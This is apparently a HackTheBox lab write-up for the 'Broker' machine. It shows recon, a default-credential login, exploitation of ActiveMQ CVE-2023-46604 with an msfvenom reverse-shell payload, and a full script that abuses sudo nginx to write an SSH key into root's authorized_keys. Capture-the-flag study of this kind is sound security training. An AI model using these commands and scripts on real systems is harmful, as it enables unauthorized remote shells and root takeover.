---
title: Broker
tags:
  - HackTheBox
  - Easy
  - Linux
  - ActiveMQ
  - Sudo-Vulnerability
  - Nginx
---
![](Pasted%20image%2020241106230259.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.243 broker.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- broker.htb > sC.txt

[redacted]
```

So I checked the website and got asked for some credentials:

![](Pasted%20image%2020241106230556.png)

I always try some basic combinations and in this case `admin:admin` worked!:

![](Pasted%20image%2020241106230631.png)

After inspecting the source code, I found the version in use of ActiveMQ (5.15.15) inside `/admin`:

![](Pasted%20image%2020241106230829.png)

## Weaponization

I searched in Google for "*activemq 5.15.15 exploit*" and found [CVE-2023-46604](https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ)

## Exploitation

I followed the instructions of the exploit:

```shell
git clone https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ.git

cd CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ

msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.24 LPORT=666 -f elf -o test.elf

# Now edit the poc-linux.xml and change the ip to you machine (in my case 10.10.14.24)

python3 -m http.server 8090

go run main.go -i {Target_IP} -u http://{IP_Of_Hosted_XML_File}:8001/poc-linux.xml
```

> I got a reverse shell :D

![](Pasted%20image%2020241106231752.png)

![](Pasted%20image%2020241106231819.png)

> After stabilizing, we can now read the user flag 

![](Pasted%20image%2020241106231938.png)

## Privilege escalation

If we run `sudo -l`:

```shell
sudo -l

[redacted]
User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

So I found a way to escalate privileges by using this [script](https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406):

- First go to the home directory of an interactive session (`cd ~`)

```shell
echo "[+] Creating configuration..."
cat << EOF > /tmp/nginx_pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
	server {
	        listen 1339;
	        root /;
	        autoindex on;
	        dav_methods PUT;
	}
}
EOF
echo "[+] Loading configuration..."
sudo nginx -c /tmp/nginx_pwn.conf
echo "[+] Generating SSH Key..."
ssh-keygen
echo "[+] Display SSH Private Key for copy..."
cat .ssh/id_rsa
echo "[+] Add key to root user..."
curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat .ssh/id_rsa.pub)"
echo "[+] Use the SSH key to get access"
```

Then run the exploit:

```shell
chmod +x exploit.sh
./exploit.sh
```

Store the SSH Private Key then use it to connect to the host:

```shell
chmod 600 root_key
ssh -i root_key root@host
```

> Now we are root and can read root flag

![](Pasted%20image%2020241106232845.png)

==Machine pwned!==